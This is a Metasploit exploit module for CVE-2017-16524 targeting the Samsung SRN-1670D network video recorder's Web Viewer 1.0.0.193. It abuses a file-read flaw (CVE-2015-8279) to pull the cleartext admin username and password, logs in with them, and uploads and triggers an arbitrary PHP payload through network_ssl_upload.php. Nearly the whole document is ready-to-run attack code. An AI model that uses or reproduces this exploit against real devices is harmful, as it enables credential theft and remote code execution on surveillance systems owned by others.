# Exploit Author: Omar MEZRAG - 0xFFFFFF / www.realistic-security.com
# Vendor Homepage: https://www.hanwhasecurity.com
# Version: Web Viewer 1.0.0.193 on Samsung SRN-1670D
# Tested on: Web Viewer 1.0.0.193 
# CVE : CVE-2017-16524
##
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;digest&#039;
 
class MetasploitModule < Msf::Exploit::Remote
     
    Rank = GoodRanking
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
 
    def initialize(info = {})
        super(update_info(info,
          &#039;Name&#039;           => &#039;Samsung SRN-1670D - Web Viewer Version 1.0.0.193 Arbitrary File Read & Upload&#039;,
          &#039;Description&#039;    => %q{
        This module exploits an Unrestricted file upload vulnerability in
        Web Viewer 1.0.0.193 on Samsung SRN-1670D devices: &#039;network_ssl_upload.php&#039;
        allows remote authenticated attackers to upload and execute arbitrary
        PHP code via a filename with a .php extension, which is then accessed via a
        direct request to the file in the upload/ directory. 
        To authenticate for this attack, one can obtain web-interface credentials 
        in cleartext by leveraging the existing Local File Read Vulnerability 
        referenced as CVE-2015-8279, which allows remote attackers to read the 
        web interface credentials via a request for the
        cslog_export.php?path=/root/php_modules/lighttpd/sbin/userpw URI.
          },
 
          &#039;Author&#039;         => [
        &#039;Omar Mezrag <omar.mezrag@realistic-security.com>&#039;,  # @_0xFFFFFF
            &#039;Realistic Security&#039;,
            &#039;Algeria&#039;
           ],
          &#039;License&#039;        => MSF_LICENSE,
          &#039;References&#039;     =>
            [
              [ &#039;CVE&#039;, &#039;2017-16524&#039; ],
              [ &#039;URL&#039;, &#039;https://github.com/realistic-security/CVE-2017-16524&#039; ],
              [ &#039;CVE&#039;, &#039;2015-8279&#039; ],
              [ &#039;URL&#039;, &#039;http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html&#039; ]
            ],
          &#039;Privileged&#039;     => true,
          &#039;Arch&#039;           => ARCH_PHP,
          &#039;Platform&#039;       => &#039;php&#039;,
          &#039;Targets&#039;        =>
            [
            [&#039;Samsung SRN-1670D == 1.0.0.193&#039;, {}]
            ],
          &#039;DefaultTarget&#039;  => 0,
          &#039;DisclosureDate&#039; => &#039;Mar 14 2017&#039;
        ))
 
        register_options(
          [
            OptString.new(&#039;RHOST&#039;, [ true, &#039;The target address.&#039; ]),
        OptString.new(&#039;RPORT&#039;, [ true, &#039;The target port (TCP).&#039;, &#039;80&#039; ]),
          ])
    end
 
 
    def check
        #
        print_status(&#039;Checking version...&#039;) 
 
        resp = send_request_cgi({
            &#039;uri&#039;     =>  "/index",
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039; => &#039;GET&#039;,
            &#039;headers&#039; =>
                {
                   &#039;User-Agent&#039; => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
                }
            })
         
        unless resp
            print_error("Connection timed out.")
            return Exploit::CheckCode::Unknown
        end
        #        <!---------------------------------   File Version 1.0.0.193   --------------------------------->
        version = nil
        if resp and resp.code == 200  and resp.body.match(/Web Viewer for Samsung NVR/)
                if resp.body =~ /File Version (\d+\.\d+\.\d+\.\d+)/
                    version = $1
                    if version == &#039;1.0.0.193&#039;
                        print_good "Found vesrion: #{version}"
                        return Exploit::CheckCode::Appears
                    end
                end
        end
 
        Exploit::CheckCode::Safe
 
    end
 
    def exploit
 
      
        print_status(&#039;Obtaining credentails...&#039;) 
      
        resp = send_request_cgi({
            &#039;uri&#039;     =>  "/cslog_export.php",
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039; => &#039;GET&#039;,
            &#039;vars_get&#039;=>
                {
                &#039;path&#039; => &#039;/root/php_modules/lighttpd/sbin/userpw&#039;,
                &#039;file&#039; => &#039;foo&#039;
                },
            &#039;headers&#039; =>
                {
                   &#039;User-Agent&#039; => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
                }
            })
         
        unless resp
            print_error("Connection timed out.")
            return Exploit::CheckCode::Unknown
        end
 
        if resp and resp.code == 200 and resp.body !~ /Authentication is failed/ and resp.body !~ /File not found/
            username =  resp.body.split(&#039;:&#039;)[0]
            password =  resp.body.split(&#039;:&#039;)[1].gsub("\n",&#039;&#039;)
            print_good "Credentials obtained successfully: #{username}:#{password}"
                 
 
                data1 = Rex::Text.encode_base64("#{username}")
                data2 = Digest::SHA256.hexdigest("#{password}")
 
                randfloat  = Random.new
                data3 =  randfloat.rand(0.9)
                data4 = data3
 
                print_status(&#039;Logging...&#039;) 
 
                resp = send_request_cgi({
                    &#039;uri&#039;     =>  "/login",
                    &#039;version&#039; => &#039;1.1&#039;,
                    &#039;method&#039; => &#039;POST&#039;,
                    &#039;vars_post&#039;=>
                        {
                            &#039;data1&#039; => data1,
                            &#039;data2&#039; => data2,
                            &#039;data3&#039; => data3,
                            &#039;data4&#039; => data4
                        },
                    &#039;headers&#039; =>
                        {
                           &#039;User-Agent&#039; => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                           &#039;DNT&#039; => "1",
                           &#039;Cookie&#039; => "IESEVEN=1"
                        }
                })
 
                unless resp
                    print_error("Connection timed out.")
                    return Exploit::CheckCode::Unknown
                end
                 
                if resp and resp.code == 200  and resp.body !~ /ID incorrecte/  and resp.body =~ /setCookie\(&#039;NVR_DATA1/
 
                    print_good(&#039;Authentication Succeeded&#039;) 
 
                    nvr_d1 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA1&#039;, &#039;(\d\.\d+)&#039;/
                    nvr_d2 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA2&#039;, &#039;(\d+)&#039;/
                    nvr_d3 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA3&#039;, &#039;(0x\h\h)&#039;/
                    nvr_d4 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA4&#039;, &#039;(0x\h\h)&#039;/
                    nvr_d7 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA7&#039;, &#039;(\d)&#039;/
                    nvr_d8 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA8&#039;, &#039;(\d)&#039;/
                    nvr_d9 = $1 if resp.body =~ /setCookie\(&#039;NVR_DATA9&#039;, &#039;(0x\h\h)&#039;/
 
                    cookie = "IESEVEN=1; NVR_DATA1=#{nvr_d1}; NVR_DATA2=#{nvr_d2}; NVR_DATA3=#{nvr_d3}; NVR_DATA4=#{nvr_d4}; NVR_DATA7=#{nvr_d7}; NVR_DATA8=#{nvr_d8}; NVR_DATA9=#{nvr_d9}"
 
                    payload_name = "#{rand_text_alpha(8)}.php"
 
                    print_status("Generating payload[ #{payload_name} ]...") 
 
                    php_payload = get_write_exec_payload(:unlink_self=>true)
                 
                    print_status(&#039;Uploading payload...&#039;) 
 
                    data = Rex::MIME::Message.new
                    data.add_part("2", nil, nil, &#039;form-data; name="is_apply"&#039;)
                    data.add_part("1", nil, nil, &#039;form-data; name="isInstall"&#039;)
                    data.add_part("0", nil, nil, &#039;form-data; name="isCertFlag"&#039;)
                    data.add_part(php_payload, &#039;application/x-httpd-php&#039;, nil, "form-data; name=\"attachFile\"; filename=\"#{payload_name}\"")
                    post_data = data.to_s
 
                    resp = send_request_cgi({
 
                        &#039;uri&#039;      => normalize_uri(&#039;/network_ssl_upload.php&#039;),
                        &#039;method&#039;   => &#039;POST&#039;,
                        &#039;vars_get&#039; => 
                            {
                            &#039;lang&#039; => &#039;en&#039;
                            },
                        &#039;headers&#039; =>
                            {
                               &#039;User-Agent&#039; => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
                            },
                        &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
                        &#039;cookie&#039;   => cookie,
                        &#039;data&#039;     => post_data
 
                        })
 
                    unless resp
                        print_error("Connection timed out.")
                        return Exploit::CheckCode::Unknown
                    end
 
                    if resp and resp.code == 200
                        print_status(&#039;Executing payload...&#039;) 
                        upload_uri = normalize_uri("/upload/" + payload_name)
                        send_request_cgi({
                            &#039;uri&#039;    => upload_uri,
                            &#039;method&#039; => &#039;GET&#039;
                        },5)
 
                        unless resp
                            print_error("Connection timed out.")
                            return Exploit::CheckCode::Unknown
                        end
 
                        if resp and resp.code != 200
                            print_error("Failed to upload")
                        end
 
                    else
                        print_error("Failed to upload")
                    end
                else
                    print_error("Authentication failed")
                end
             
        else
            print_error "Error obtaining credentails"
        end
    end
end

